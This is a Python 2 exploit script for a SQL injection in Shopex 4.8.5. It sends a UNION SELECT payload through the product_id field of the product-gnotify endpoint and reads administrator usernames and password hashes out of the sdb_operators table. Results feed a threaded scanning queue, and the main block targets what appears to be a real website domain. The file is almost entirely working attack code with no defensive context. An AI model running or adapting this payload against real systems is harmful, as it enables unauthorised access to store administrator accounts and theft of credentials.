#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#Author:MXi4oyu
#Email:798033502@qq.com
#Shopex 4.8.5 SQL Injection Exp
#转载请保留版权，谢谢合作

import httplib2
from urllib import urlencode
import re
import sys
import threading

from class_Queue import url_exp

class bc_shopex_4_8_5(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        self.one(self.url)

    def one(self,arg):
        try:
            url=arg+'/?product-gnotify'
            #定义要提交的数据
            html='1 and 1=2 union select 1,2,3,4,5,6,7,8,concat(0x245E,username,0x2D3E,userpass,0x5E24),10,11,12,13,14,15,16,17,18,19,20,21,22 from sdb_operators limit 0,1'
            data={"goods[goods_id]":'3',"goods[product_id]":html}
            h = httplib2.Http('.cache')
            response,content = h.request(url, 'POST', urlencode(data),
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
            gre=re.compile(r'\$\^(.+)?\^\$')
            s=content
            lpwd=gre.findall(s)
            if len(lpwd)==1:
                #pwd=lpwd[0]
                #print url+"\n"+pwd+"\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
                EXP_list=[1,self.url,"bc","CN_bc_shopex_4_8_5",url,lpwd[0],"",""]
                #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                url_exp.put(EXP_list,0.5)   #插入队列
            else:
                pass
            return 1
        except Exception,e:
        #print e
            return 0




################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        threads.append(bc_shopex_4_8_5("www.haamei.com"))

    for t in threads:
        t.start()
